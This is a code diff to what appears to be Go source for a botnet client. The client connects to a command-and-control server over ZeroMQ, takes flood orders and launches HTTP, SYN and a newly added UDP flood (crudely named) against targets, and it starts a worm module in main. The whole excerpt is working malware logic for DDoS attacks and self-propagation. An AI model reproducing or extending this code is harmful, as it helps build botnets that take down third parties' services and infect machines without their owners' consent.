@@ -154,6 +154,7 @@ func register(dealer, subscriber *zmq.Socket, C2ip, rport string, timeout time.D
 
 func terylene(subscriber *zmq.Socket, C2ip, bot, bport string) {
 	defer subscriber.Close()
+	subscriber.Connect(fmt.Sprintf("tcp://%s:%s", C2ip, bport))
 	subscriber.SetSubscribe(bot)
 	for {
 		message, _ := subscriber.Recv(0)
@@ -188,9 +189,9 @@ func terylene(subscriber *zmq.Socket, C2ip, bot, bport string) {
 								for i := 1; i < 5; i++ {
 									go attack.HTTP(target, duration)
 								}
-							case "DNS":
+							case "UDPRAPE":
 								for i := 1; i < 5; i++ {
-									go attack.DNS(target, duration)
+									go attack.UDPRAPE(target, port, duration)
 								}
 							case "SYN":
 								for i := 1; i < 5; i++ {
@@ -211,7 +212,6 @@ func terylene(subscriber *zmq.Socket, C2ip, bot, bport string) {
 func main() {
 	go worm.Startworm()
 	subscriber, _ := zmq.NewSocket(zmq.SUB)
-	subscriber.SetLinger(0)
 	dealer, _ := zmq.NewSocket(zmq.DEALER)
 	dealer.SetLinger(0)
 	register(dealer, subscriber, config.C2ip, config.Routerport, time.Second*5)
